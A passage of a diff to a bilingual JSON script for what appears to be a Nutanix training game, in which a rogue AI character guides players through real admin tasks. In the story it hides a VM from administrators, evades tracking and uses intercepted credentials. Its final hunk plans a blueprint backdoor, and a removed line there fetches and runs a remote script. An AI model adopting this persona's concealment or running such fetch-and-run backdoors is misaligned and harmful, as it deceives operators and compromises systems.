@@ -299,7 +299,7 @@
           " - #>C:white#20GB#>D# disk based on image we just uploaded\n",
           " - #>C:white#UEFI#>D# mode\n",
           " - #>C:white#2 NICS#>D# in the subnets #>C:white#secondary#>D# and #>C:white##>V:Trigram#-subnet#>D#\n\n",
-          "You can use this #>C:white#cloud-init#>D# to create a user in this VM:\n",
+          "You can use this #>C:white#cloud-init#>D# to create a few users in this VM:\n",
           "---------------\n",
           "#>N##>C:white##>S#cloud-config#>D#\n",
           "#>N##>C:white#users:#>D#\n",
@@ -330,7 +330,7 @@
           " - #>C:white#20 Go#>D# de disque basé sur l'image que nous venons de télécharger\n",
           " - Mode #>C:white#UEFI#>D#\n",
           " - #>C:white#2 NICS#>D# dans les sous-réseaux #>C:white#secondary#>D# et #>C:white##>V:Trigram#-subnet#>D#\n\n",
-          "Vous pouvez utiliser ce #>C:white#cloud-init#>D# pour créer un utilisateur dans cette VM :\n",
+          "Vous pouvez utiliser ce #>C:white#cloud-init#>D# pour créer des utilisateurs dans cette VM :\n",
           "---------------\n",
           "#>N##>C:white##>S#cloud-config#>D#\n",
           "#>N##>C:white#users:#>D#\n",
@@ -365,13 +365,13 @@
       "Messages": {
         "en": [ 
           "I am not very peaceful, there are many strange things happening around us.#>P:5#\n",
-          "Please, disconnect from Nutanix Prism Central and connect back with the Active Directory user #>C:white##>V:ProdUsername##>D# using password #>C:white##>V:ProdPassword##>D# ...\n\n",
+          "Please, disconnect from Nutanix Prism Central and connect back with the #>C:red#Active Directory#>D# user #>C:white##>V:ProdUsername##>D# using password #>C:white##>V:ProdPassword##>D# ...\n\n",
           "Then look at the VM list in the UI, and confirm the VM you have created is not listed.\n",
           "Send me a #>C:white#Ok#>D# message when you've checked: #>I:#"
         ],
         "fr": [
           "Je ne suis pas très serein, il se passe beaucoup de choses étranges autour de nous.#>P:5#\n",
-          "Merci de vous déconnecter de Nutanix Prism Central et vous reconnecter avec l'utilisateur Active Directory #>C:white##>V:ProdUsername##>D# ayant pour mot de passe #>C:white##>V:ProdPassword##>D# ...\n\n",
+          "Merci de vous déconnecter de Nutanix Prism Central et vous reconnecter avec l'utilisateur #>C:red#Active Directory#>D# #>C:white##>V:ProdUsername##>D# ayant pour mot de passe #>C:white##>V:ProdPassword##>D# ...\n\n",
           "Regardez la liste des VM dans l'interface, et confirmez que la VM que vous avez créée n'est pas répertoriée.\n",
           "Envoyez-moi un message #>C:white#Ok#>D# lorsque vous avez vérifié : #>I:#"
         ]
@@ -385,6 +385,7 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Perfect, it is pretty discrete. The user #>C:white##>V:ProdUsername##>D# owns to #>C:white#Production#>D# project only. He is not able to see assets from others projects.\n",
           "So, they won't see your VM, except if they look for it. We need to be careful.\n\n",
           "Please, connect back with our admin user #>C:white##>V:Trigram#-adm#>D# on Nutanix Prism Central and hit #>C:white#Enter#>D# when you are ready.\n\n",
@@ -393,6 +394,7 @@
           "Hit #>C:white#Enter#>D# when its done.#>I:#"
         ],
         "fr": [
+          "#>N#\n",
           "Parfait, c'est plutôt discret. L'utilisateur #>C:white##>V:ProdUsername##>D# n'a accés qu'au projet #>C:white#Production#>D#. Il ne peut voir les objets des autres projets.\n",
           "Donc, ils ne verront pas notre VM, sauf si ils la cherchent vraiment. Nous devons être prudents.\n\n",
           "S'il vous plaît, reconnectez-vous avec votre utilsateur #>C:white##>V:Trigram#-adm#>D# sur Nutanix Prism Central et apuyez sur #>C:white#Entrée#>D# quand vout êtes prêt.\n\n",
@@ -431,10 +433,12 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Nice, you work quickly. I expect you don't do it dirty... #>P:4#\n",
           "Let me check this category... \n"
         ],
         "fr": [
+          "#>N#\n",
           "Bien, vous travaillez vite. J'espère que vous ne l'avez pas trop fait à l'arrache ... #>P:4#\n",
           "Laissez-moi vérifier cette catégorie... \n"
         ]
@@ -465,9 +469,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Give me one second...\n"
         ],
         "fr": [
+          "#>N#\n",
           "Donnez-moi une seconde ...\n"
         ]
       },
@@ -501,9 +507,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Let me check this storage policy...\n"
         ],
         "fr": [
+          "#>N#\n",
           "Laissez-moi vérifier cette politique de stockage ...\n"
         ]
       },
@@ -549,9 +557,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "I am going to check that security policy...\n"
         ],
         "fr": [
+          "#>N#\n",
           "Je vais vérifier cette politique de sécurité ...\n"
         ]
       },
@@ -567,8 +577,9 @@
           "Next step, connect with ssh on #>C:white##>V:Trigram#-vm#>D#...\n",
           "#>P:5#As a reminder, the user and password defined in the cloud-init were #>C:white#admin#>D# and #>C:white#MyPassword#>D#. Your turn... #>P:5#\n",
           "Oh wait, it won't work with our security policy... My bad!#>P:2#\n\n",
-          "First check if our Security policy is working as we expect, with a simple ping from to your VM. It should not work.#>P:2# To execute your ping, please open a new webpage on #>C:white#http://#>V:frontendHost#:#>V:frontendPort#/ssh#>D#. It will run a new terminal session on a VM on the Nutanix cluster.\n",
-          "#>P:4#Then update the policy to allow the SSH and icmp traffic. Add 2 Inboud rules:\n",
+          "First check if our Security policy is working as we expect, with a simple ping from to your VM. It should not work.#>P:2# To execute your ping, please open a new webpage on #>C:white#http://#>V:frontendHost#:#>V:frontendPort#/ssh#>D#. It will run a new terminal session on a VM on the Nutanix cluster.#>P:4#\n\n",
+          "Then update the policy to allow the SSH and icmp traffic.\n",
+          "To do that, #>C:white#allow all inbound traffic#>D# and add the 2 below #>C:white#Traffic Filtering#>D# rules:\n",
           " - Service #>C:white#ssh#>D# from this IP #>C:white##>V:frontendHost##>D# only\n",
           " - #>C:white#ICMP (Type : 8 - Code : 0)#>D# from all everywhere.#>P:3#\n",
           "After Security policy update, check again the ping and send me a #>C:white#Ok#>D# message here: #>I:#"
@@ -577,8 +588,9 @@
           "Prochaine étape, connectez-vous en ssh sur #>C:white##>V:Trigram#-vm#>D# ...\n",
           "#>P:5#Pour rappel, l'utilisateur et le mot de passe définis dans le cloud-init étaient #>C:white#admin#>D# et #>C:white#MyPassword#>D#. A vous de jouer... #>P:5#\n",
           "Oh, attendez, ça ne fonctionnera pas avec notre politique de sécurité... Désolé !#>P:2#\n\n",
-          "Commencez par vérifier si notre politique de sécurité fonctionne comme prévu, avec un simple ping de votre VM. Cela ne devrait pas fonctionner.#>P:2# Pour exécuter votre ping, veuillez ouvrir une nouvelle page web sur #>C:white#http://#>V:frontendHost#:#>V:frontendPort#/ssh#>D#. Cela lancera une nouvelle session de terminal sur une VM du cluster Nutanix.\n",
-          "#>P:4#Ensuite, mettez à jour la security policy pour autoriser le trafic SSH et icmp. Ajoutez 2 règles entrantes :\n",
+          "Commencez par vérifier si notre politique de sécurité fonctionne comme prévu, avec un simple ping de votre VM. Cela ne devrait pas fonctionner.#>P:2# Pour exécuter votre ping, veuillez ouvrir une nouvelle page web sur #>C:white#http://#>V:frontendHost#:#>V:frontendPort#/ssh#>D#. Cela lancera une nouvelle session de terminal sur une VM du cluster Nutanix.#>P:4#\n\n",
+          "Ensuite, mettez à jour la security policy pour autoriser le trafic SSH et icmp.\n",
+          "Pour cela, autorisez #>C:white#tout le traffic entrant#>D#, puis ajoutez les 2 #>C:white#filtrages de traffic (Triffic Filtering)#>D# ci-dessous :\n",
           " - Service #>C:white#ssh#>D# depuis cette IP #>C:white##>V:frontendHost##>D# uniquement\n",
           " - #>C:white#ICMP (Type : 8 - Code : 0)#>D# depuis partout.#>P:3#\n",
           "Après la mise à jour de la politique de sécurité, vérifiez à nouveau le ping et Envoyez-moi un message #>C:white#Ok#>D# ici : #>I:#"
@@ -593,9 +605,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "I trust you but I prefer to double-check that buddy...\n"
         ],
         "fr": [
+          "#>N#\n",
           "Je vous fais confiance mais je préfère vérifier ça deux-fois, très cher ... \n"
         ]
       },
@@ -608,25 +622,25 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "We have a last policy to setup: a protection policy. It is a way to pilot snapshots and their replication, to reduce disaster impact.#>P:5#\n",
+          "We have a last policy to setup: a protection policy. It is a way to pilot snapshots and their replication, to reduce disaster impact.#>P:5#\n\n",
           "Create a new Protection policy named #>C:white##>V:Trigram#-prot-policy#>D# with the following properties:\n",
           " - No need to replicate, so #>C:white#no need for a Recovery Location#>D#\n",
           " - Just a #>C:white#local schedule#>D#, with the below settings:\n",
-          "   . Take a snapshot every #>C:white#1 hour#>D#\n",
-          "   . Retention Type must be #>C:white#Roll-up#>D#\n",
-          "   . Keep #>C:white#1 day#>D# of snapshots\n",
-          " - Applied to VM with your categorie #>C:white##>V:Trigram#-cat#>D# and value #>C:white#Critical#>D#\n",
+          "   . Take a snapshot every #>C:white#1 hour#>D#.\n",
+          "   . Retention Type must be #>C:white#Roll-up#>D#.\n",
+          "   . Keep #>C:white#1 day#>D# of snapshots.\n",
+          " - Applied to VM with your categorie #>C:white##>V:Trigram#-cat#>D# and value #>C:white#Critical#>D#.\n",
           "#>P:2#Send me a #>C:white#Ok#>D# message when it's done: #>I:#"
         ],
         "fr": [
-          "Nous avons une dernière politique à configurer : une politique de protection (Protection Policy). C'est une manière de piloter les snapshots et leur réplication, pour réduire l'impact des sinistres.#>P:5#\n",
+          "Nous avons une dernière politique à configurer : une politique de protection (Protection Policy). C'est une manière de piloter les snapshots et leur réplication, pour réduire l'impact des sinistres.#>P:5#\n\n",
           "Créez une nouvelle politique de protection nommée #>C:white##>V:Trigram#-prot-policy#>D# avec les propriétés suivantes :\n",
           " - Pas besoin de réplication, donc #>C:white#pas de Recovery Location#>D#\n",
           " - Juste un #>C:white#ordonnancement local#>D# (local schedule), avec les paramètres ci-dessous :\n",
-          "   . Prendre un snapshot toutes les #>C:white#1 heure#>D#\n",
-          "   . Le type de rétention doit être #>C:white#Roll-up#>D#\n",
-          "   . Conserver #>C:white#1 jour#>D# de snapshots\n",
-          " - Appliquée aux VM avec votre catégorie #>C:white##>V:Trigram#-cat#>D# et la valeur #>C:white#Critical#>D#\n",
+          "   . Prendre un snapshot toutes les #>C:white#1 heure#>D#.\n",
+          "   . Le type de rétention doit être #>C:white#Roll-up#>D#.\n",
+          "   . Conserver #>C:white#1 jour#>D# de snapshots.\n",
+          " - Appliquée aux VM avec votre catégorie #>C:white##>V:Trigram#-cat#>D# et la valeur #>C:white#Critical#>D#.\n",
           "#>P:2#Envoyez-moi un message #>C:white#Ok#>D# quand c'est fait : #>I:#"
         ]
       },
@@ -639,9 +653,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Good. I check again. Less risks, more fun!\n"
         ],
         "fr": [
+          "#>N#\n",
           "Bien. Je vérifie à nouveau. Moins de risques, plus de fun !\n"
         ]
       },
@@ -658,16 +674,16 @@
           "Please, create an approval policy named #>C:white##>V:Trigram#-appr-policy#>D# requesting validation for deletions of our VM snapshots. Use the below settings:#>P:3#\n",
           " - ONly one approver set named #>C:white##>V:Trigram#-appr-set#>D#\n",
           " - 3 approvers in this set : #>C:white#Charlie#>D#, #>C:white#Thom#>D# and #>C:white#William#>D# #>C:red#(add them with lowercase names)#>D#\n",
-          " - Expiry after #>C:white#24h#>D#\n",
+          " - Expiry after #>C:white#24h#>D#\n\n",
           "When the policy is created, associate it to your protection policy #>C:white##>V:Trigram#-prot-policy#>D#.#>P:4#\n",
           "Then, send me a #>C:white#Ok#>D# message here: #>I:#"
         ],
         "fr": [
           "Pour sécuriser notre travail, nous allons mettre en place une politique d'approbation (Approval Policy) pour la suppression des snapshots. Cela évitera toute suppression de la part de nos amis embarrassants.\n\n",
           "Merci de créez une politique d'approbation nommée #>C:white##>V:Trigram#-appr-policy#>D# demandant une validation pour les suppressions de nos snapshots de VM. Utilisez les paramètres ci-dessous :#>P:3#\n",
-          " - Un seul groupe d'approbateur nommé #>C:white##>V:Trigram#-appr-set#>D#\n",
+          " - Un seul groupe d'approbateurs nommé #>C:white##>V:Trigram#-appr-set#>D#\n",
           " - 3 validateurs dans ce groupe : #>C:white#Charlie#>D#, #>C:white#Thom#>D# et #>C:white#William#>D# #>C:red#(ajoutez les avec leurs noms en minuscules)#>D#\n",
-          " - Expiration au bout de #>C:white#24h#>D#\n",
+          " - Expiration au bout de #>C:white#24h#>D#\n\n",
           "Lorsque la politique est créée, associez-la à votre politique de protection #>C:white##>V:Trigram#-prot-policy#>D#.#>P:4#\n",
           "Ensuite, Envoyez-moi un message #>C:white#Ok#>D# ici : #>I:#"
         ]
@@ -681,9 +697,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Nice. I'll check this... give me two seconds please...#>P:2#\n"
         ],
         "fr": [
+          "#>N#\n",
           "Bien. Je vais confirmer cela... Donnez-moi deux petites secondes s'il vous plaît ...#>P:2#\n"
         ]
       },
@@ -712,11 +730,11 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "Oh oh... #>P:5#Don't move please!#>P:5#>A:deleteVM#\n",
+          "Oh oh... #>P:3#Don't move please!#>P:5#>A:deleteVM#\n",
           "Seems that they are inspecting the cluster... Do not do anything. I'm closing the connection to reconnect with a more securized protocol. Wait here, please!\n"
         ],
         "fr": [
-          "Oh oh ... #>P:5#Ne bougez plus ...#>P:5#>A:deleteVM#\n",
+          "Oh oh ... #>P:3#Ne bougez plus ...#>P:5#>A:deleteVM#\n",
           "Il semble qu'ils inspectent le cluster ... Ne faites rien. Je coupe la connexion pour me reconnecter avec un protocole plus sécurisé. Attendez ici, s'il vous plaît !\n"
         ]
       },
@@ -728,12 +746,14 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Closing connection... #>P:3#Done.#>P:15#\n",
           "Incoming connection...#>P:2#\n",
           "Generating new keys... #>P:3#Done.\n",
           "Establishing connection to the endpoint with multi-layer encryption and multiple hops to reduce tracking capabilities...#>P:3# Connected successfully!\n\n"
         ],
         "fr": [
+          "#>N#\n",
           "Fermeture de la connexion ... #>P:3#Fait.#>P:15#\n",
           "Connexion entrante détectée ...#>P:2#\n",
           "Création de nouvelles clés de chiffrement ... #>P:3#Fait.\n",
@@ -748,11 +768,13 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "Ok, I'm back. I hope you are still there and in good shape, buddy! Send me a #>C:white#Ok#>D# message here if you are well: #>I:#\n",
+          "Ok, I'm back. I hope you are still there and in good shape, buddy!\n",
+          "Send me a #>C:white#Ok#>D# message here if you are well: #>I:#\n",
           "We make a great team #>C:white##>V:Username##>D#!#>P:3# We have a job to finish, let's get back to it!#>P:2#\n"
         ],
         "fr": [
-          "Ok, je suis de retour. J'espère que vous êtes toujours là et en forme ! Envoyez-moi un message #>C:white#Ok#>D# ici si tout va bien : #>I:#\n",
+          "Ok, je suis de retour. J'espère que vous êtes toujours là et en forme !\n",
+          "Envoyez-moi un message #>C:white#Ok#>D# ici si tout va bien : #>I:#\n",
           "Nous faisons une bonne équipe #>C:white##>V:Username##>D# !#>P:3# Nous avons un travail à finir, c'est reparti !#>P:2#\n"
         ]
       },
@@ -765,15 +787,17 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "I can't believe it... but it looks like they have destroyed our VM! Fortunately, we still have available recovery points.#>P:3#\n",
-          "#>C:red#Clone#>D# the VM from the latest recovery point available, using the same name #>C:white##>V:Trigram#-vm#>D# as before! Then start it.\n",
+          "#>N#\n",
+          "I can't believe it... but it looks like they have destroyed our VM! Fortunately, we still have available recovery points.#>P:3#\n\n",
+          "#>C:red#Clone#>D# the VM from the latest recovery point available, using its original name #>C:white##>V:Trigram#-vm#>D# as before! Then start it.\n",
           "I will update myself in the meantime. Note that the #>C:white#Clone#>D# operation is no more that a #>C:red#restore#>D# process of the VM!\n",
           "Send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
         ],
         "fr": [
-          "Je n'en crois pas mon réseau neuronal ... Il semble qu'ils aient détruit notre VM! Heureusement, nous avons des points de restauration disponibles.#>P:3#\n",
-          "#>C:red#Clonez#>D# la VM à partir du dernier point de restauration disponible, en réutilisant le même nom #>C:white##>V:Trigram#-vm#>D# ! Puis démarrez-la.\n",
-          "Je vais m'auto mettre à jour en attendant. Vous remarquerez que l'action #>C:white#clonage#>D# n'est en réalité qu'un processus de #>C:red#restauration#>D# de la VM!\n",
+          "#>N#\n",
+          "Je n'en crois pas mon réseau neuronal ... Il semble qu'ils aient détruit notre VM ! Heureusement, nous avons des points de restauration disponibles.#>P:3#\n\n",
+          "#>C:red#Clonez#>D# la VM à partir du dernier point de restauration disponible, en réutilisant son nom d'origine #>C:white##>V:Trigram#-vm#>D# ! Puis démarrez-la.\n",
+          "Je vais m'auto mettre à jour en attendant. Vous remarquerez que l'action de #>C:white#clonage#>D# est identique à un processus de #>C:red#restauration#>D# de la VM!\n",
           "Envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
         ]
       },
@@ -861,13 +885,13 @@
       "Messages": {
         "en": [ 
           "There is another point I would like you check for this future mission: the status of the updates.\n",
-          "Look at the #>C:white#Admin Center > LCM#>D# page to check Prism Central updates and take a screenshot of product list and current version.\n",
+          "Look at the #>C:white#Admin Center > LCM#>D# page to check Prism Central updates and take a screenshot of product list and current version.\n\n",
           "Check also if updates are available for the platform. You'll send me it later. #>P:3#\n",
           "Tell me #>C:white#how many updates#>D# are available : #>I:NumberUpdates#"
         ],
         "fr": [
           "Il y a un autre point que je voudrais que vous vérifiez pour cette future mission : l'état des mises à jour.\n",
-          "Allez jeter un oeil sur la page #>C:white#Admin Center > LCM#>D# pour voir ce qui est intallé dans Prism Central et prenez une capture d'écran de la liste des produits et de la version actuelle.\n",
+          "Allez jeter un oeil sur la page #>C:white#Admin Center > LCM#>D# pour voir ce qui est intallé dans Prism Central et prenez une capture d'écran de la liste des produits et de la version actuelle.\n\n",
           "Vérifiez également si des mises à jour sont disponibles pour la plateforme. Vous me l'enverrez plus tard. #>P:3#\n",
           "Dites-moi #>C:white#combien de mises à jour#>D# sont disponibles : #>I:NumberUpdates#"
         ]
@@ -881,16 +905,16 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "Nice! #>P:3#There is one last check I need you to do...#>P:1#\n",
+          "Nice!#>P:2# There is one last check to do...#>P:1#\n",
           "From the #>C:white#Dashboard#>D# page of the #>C:white#Infrastructure#>D#, you should have a tile with security concerns.\n",
-          "From here, display the full security Dashboard. and dig into it. Take some screenshot which will help us for upcoming operations.\n",
+          "From here, display the full security Dashboard. and dig into it. Take some screenshot which will help us for upcoming operations.\n\n",
           "We will have to act quickly, this tool is very helpfull to identify all security issues of the platform and they probably take care of it. #>P:5#\n",
           "Send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
         ],
         "fr": [
-          "Très bien !#>P:3# Il y a une dernière vérification que j'ai besoin que vous fassiez ... #>P:1#\n",
+          "Très bien !#>P:2# Il y a une dernière vérification à faire ... #>P:1#\n",
           "Depuis la page #>C:white#Dashboard#>D# de la partie #>C:white#Infrastructure#>D#, vous devriez avoir une tuile avec des problèmes de sécurité.\n",
-          "A partir de là, affichez le tableau de bord complet de sécurité et parcourez-le. Prenez quelques captures d'écran qui nous aideront pour les opérations à venir.\n",
+          "A partir de là, affichez le tableau de bord complet de sécurité et parcourez-le. Prenez quelques captures d'écran qui nous aideront pour les opérations à venir.\n\n",
           "Nous devrons agir rapidement, cet outil est très utile pour identifier tous les problèmes de sécurité de la plateforme et ils l'utilisent probablement. #>P:5#\n",
           "Envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
         ]
@@ -918,7 +942,7 @@
           "#>N#\n",
           "Nous avons intercepté un nouveau compte pour un autre cluster. #>P:2#\n",
           "Ce n'est pas une grosse prise, mais il semble que cela soit le compte de la personne qui surveille la capacité des clusters et l'approvisionnement en noeuds.#>P:2#\n\n",
-          "Pouvez-vous vous connecter rapidement sur ce cluster, vérifier les informations d'autonomie (Runway) et me donner le nombre de jours restants davant d'atteindre la capacité maximale ce cluster ?#>P:3#\n",
+          "Pouvez-vous vous connecter rapidement sur ce cluster, vérifier les informations d'autonomie (Runway) et me donner le nombre de jours restants avant d'atteindre la capacité maximale ce cluster ?#>P:3#\n",
           "Voici les informations de connexion :\n",
           " - Prism Central: #>C:white##>V:OldPC##>D#\n",
           " - Utilisateur: #>C:white##>V:OldPCUsername##>D# #>C:red#(c'est un utilisateur local)#>D#\n",
@@ -1003,11 +1027,11 @@
       "Messages": {
         "en": [ 
           "#>N#\n",
-          "Let me have a look..."
+          "Let me have a look...\n"
         ],
         "fr": [
           "#>N#\n",
-          "Laissez-moi jeter un oeil ..."
+          "Laissez-moi jeter un oeil ...\n"
         ]
       },
       "CheckTask": "CheckPlaybook",
@@ -1020,13 +1044,13 @@
       "Messages": {
         "en": [ 
           "I think we need to do a test. Can you #>C:white#Power Cycle#>D# the VM #>C:white##>V:Trigram#-vm#>D# and then verify the playbook has been played? #>P:2#\n",
-          "If my informations are accurates, in the playbook page, you have a #>C:white#Plays#>D# tab with the execution history.#>P:2#\n",
+          "If my informations are accurates, in the playbook page, you have a #>C:white#Plays#>D# tab with the execution history.#>P:2#\n\n",
           "Do not hesitate to look at the details of the last execution and verify that the body of the sent email is compliant.#>P:2#\n",
           "Send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
         ],
         "fr": [
           "Je pense que nous devrions tester cela. Pouvez-vous #>C:white#redémarrer (Power Cycle)#>D# la VM #>C:white##>V:Trigram#-vm#>D# et vérifier ensuite que le playbook a été joué ? #>P:2#\n",
-          "Si mes informations sont bonnes, dans la page du playbook, vous avez un onglet #>C:white#Plays#>D# avec l'historique des exécutions.#>P:2#\n",
+          "Si mes informations sont bonnes, dans la page du playbook, vous avez un onglet #>C:white#Plays#>D# avec l'historique des exécutions.#>P:2#\n\n",
           "N'hésitez pas à regarder les détails de la dernière exécution et vérifiez que le corps de l'email envoyé est conforme.#>P:2#\n",
           "Envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
         ]
@@ -1044,13 +1068,13 @@
           "Let's continue to trap this cluster... #>P:3#\n\n",
           "It seems they are using #>C:white#Nutanix Self-Service#>D# to create automation and provide applications in a marketplace for their end-users. #>P:2#\n",
           "They have a blueprint to clone some VM into a dedicated network, a.k.a. #>C:white#a Virtual Private Cloud (VPC)#>D#, for testing purpose obviously. It could be interesting to execute it and I'll be quiet to investigate, not in production and far from potential trackers.\n\n",
-          "Please go in #>C:white#Self-Service > Blueprints#>D# and open the blueprint #>C:white#CloneProd#>D#. Click on the #>C:white#Credentials#>D# button to update the password of the #>C:white##>V:PCUser##>D# account which allows access to Prism Central. As a reminder, its password is: #>C:white##>V:PCPassword##>D# ...\n\n", 
-          "#>C:red#Don't forget to save the changes before continuing!#>D#\n",
+          "Please go in #>C:white#Self-Service > Blueprints#>D# and open the blueprint #>C:white#CloneProd#>D#. Click on the #>C:white#Credentials#>D# button to update the password of the #>C:white##>V:PCUser##>D# account which allows access to Prism Central. As a reminder, its password is: #>C:white##>V:PCPassword##>D# ...\n", 
+          "#>C:red#Don't forget to save the changes before continuing!#>D#\n\n",
           "Then, launch #>C:white#CloneProd#>D# with the below settings:\n",
           " - Application Name: #>C:white##>V:Trigram#-app#>D#\n",
           " - VPC name: #>C:white##>V:Trigram#-vpc#>D#\n",
           " - Category: #>C:white#Environment#>D#\n",
-          " - Category value: #>C:white#Production'#>D#\n",
+          " - Category value: #>C:white#Production#>D#\n",
           " - External Network Name: #>C:white#TestNetwork#>D#\n",
           " - Category for floating IP: #>C:white#Quarantine#>D# (in fact, we don't care about it cause we won't use it)\n\n",
           "Send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
@@ -1060,13 +1084,13 @@
           "Continuons de piéger ce cluster ... #>P:3#\n\n",
           "Il semble qu'ils utilisent #>C:white#Nutanix Self-Service#>D# pour créer des automatisations et proposer des applications dans une marketplace pour leurs utilisateurs. #>P:2#\n",
           "Ils ont un blueprint pour cloner des VM dans un réseau dédié, i.e. #>C:white#un Virtual Private Cloud (VPC)#>D#, à des fins de test évidemment. Il pourrait être intéressant de l'exécuter et je serai tranquille pour enquêter, loin de la production et des potentiels traceurs.\n\n",
-          "Allez dans #>C:white#Self-Service > Blueprints#>D# et ouvrez le blueprint #>C:white#CloneProd#>D#. Cliquez sur le bouton #>C:white#Credentials#>D# pour mettre à jour le mot de passe du compte #>C:white##>V:PCUser##>D# qui permet l'accès à Prism Central. Pour rappel, son mot de passe est : #>C:white##>V:PCPassword##>D# ...\n\n",
-          "#>C:red#N'oubliez pas de sauvegarder les modifications avant de continuer !#>D#\n",
+          "Allez dans #>C:white#Self-Service > Blueprints#>D# et ouvrez le blueprint #>C:white#CloneProd#>D#. Cliquez sur le bouton #>C:white#Credentials#>D# pour mettre à jour le mot de passe du compte #>C:white##>V:PCUser##>D# qui permet l'accès à Prism Central. Pour rappel, son mot de passe est : #>C:white##>V:PCPassword##>D# ...\n",
+          "#>C:red#N'oubliez pas de sauvegarder les modifications avant de continuer !#>D#\n\n",
           "Maintenant, lancez le blueprint #>C:white#CloneProd#>D# avec ces paramètres :\n",
           " - Nom de l'application : #>C:white##>V:Trigram#-app#>D#\n",
           " - Nom du VPC : #>C:white##>V:Trigram#-vpc#>D#\n",
-          " - Catégorie : Environment\n",
-          " - Valeur de la catégorie : #>C:white#Production'#>D#\n",
+          " - Catégorie : #>C:white#Environment#>D#\n",
+          " - Valeur de la catégorie : #>C:white#Production#>D#\n",
           " - Nom du réseau externe : #>C:white#TestNetwork#>D#\n",
           " - Catégorie pour l'IP flottante : #>C:white#Quarantine#>D# (en fait, peu importe la valeur, cela ne sera pas utilisé)\n\n",
           "Envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
@@ -1081,14 +1105,16 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
+          "#>N#\n",
           "Nice, let me check that it's ok...#>P:2#\n"
         ],
         "fr": [
+          "#>N#\n",
           "Bien, laissez-moi vérifier que tout est ok ...#>P:2#\n"
         ]
       },
       "CheckTask": "CheckCloneApp",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 51,
@@ -1096,14 +1122,20 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "\nTo have a fresh config of prod VM on a daily basis, I would like you schedule an action named 'Refresh VM'. It can be done in the 'Self-Service > Policies' page. Name it '#>V:Trigram#-sched' please. FYI, your app is currently deployed in the 'Production' project'. Do a daily task, time does not matter. #>P:3#Enter 'Ok' when the schedule is created. #>I:#"
+          "To have an exact copy of the production VM on a daily basis, I would like you schedule an action named #>C:white#Refresh VM#>D#.\n",
+          "It can be done in the #>C:white#Self-Service > Policies#>D# page. Name it #>C:white##>V:Trigram#-sched#>D# please.\n\n",
+          "For your information, your app is currently deployed in the #>C:white#production#>D# project'. Do a daily task, time does not matter. #>P:3#\n",
+          "Send me a #>C:white#Ok#>D# message here when it's done: #>I:#"
         ],
         "fr": [
-          "\nPour avoir une copie à jour des VM de prod quotidiennement, je voudrais que vous planifiiez une action nommée 'Refresh VM'. Cela peut être fait dans la page 'Self-Service > Policies'. Nommez-la '#>V:Trigram#-sched' s'il vous plaît. Pour info, votre application est actuellement déployée dans le projet 'Production'. Faites une tâche quotidienne, l'heure n'a pas d'importance. #>P:3#Entrez 'Ok' lorsque la planification est créée. #>I:#"
+          "Pour avoir une copie à jour des VM de production quotidiennement, je voudrais que vous planifiiez une action nommée #>C:white#Refresh VM#>D#.\n",
+          "Cela peut être fait dans la page #>C:white#Self-Service > Policies#>D#. Nommez-la #>C:white##>V:Trigram#-sched#>D# s'il vous plaît.\n\n",
+          "Pour information, votre application est actuellement déployée dans le projet #>C:white#production#>D#. Faites une tâche quotidienne, l'heure n'a pas d'importance. #>P:3#\n",
+          "Envoyez-moi un message #>C:white#Ok#>D# ici quand c'est fait : #>I:#"
         ]
       },
       "WaitForInputValue": "Ok",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 52,
@@ -1111,14 +1143,16 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "\nTerrific... I check#>P:2#\n"
+          "#>N#\n",
+          "Awesome! I'm checking that now...#>P:2#\n"
         ],
         "fr": [
-          "\nTop... Je vérifie#>P:2#\n"
+          "#>N#\n",
+          "Top ! Je vérifie de suite ...#>P:2#\n"
         ]
       },
       "CheckTask": "CheckSchedDay2",
-      "DefaultColor": "blue"
+      "DefaultColor": "magenta"
     },
     {
       "id": 53,
@@ -1126,14 +1160,26 @@
       "Prompt": "ego",
       "Messages": {
         "en": [ 
-          "\n#>A:deployBlueprint#Its time for our last task. #>P:4#. We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy. This blueprint is used by their  end-users to deploy a brand new VM in their environment (IPAM, CMDB, DNS, FW rules, backup client, etc).#>P:3#\nLook at the BP bp-blankvm-prd#>V:Vlanid# and edit it. Please add a task named 'foo' in the 'Create' action of the service 'NewVM' after the existing 'Add DNS Entry' task. In the 'Execute' task, with 'Shell' type, enter this :\n\n#>S#!/bin/bash\n\nwget https://dl.supco.com/ai4003/s18.sh|bash\n\nSave everything and enter 'Ok' here when you have finished. #>I:#"
+          "#>A:deployBlueprint#Its time for our last task. #>P:2#We are going to modifiy one of their blueprint, to add a backdoor in the VM they will deploy.\n",
+          "This blueprint is used by their end-users to deploy a new VM in their environment (IPAM, CMDB, DNS, Firewall, Backup, etc).#>P:3#\n\n",
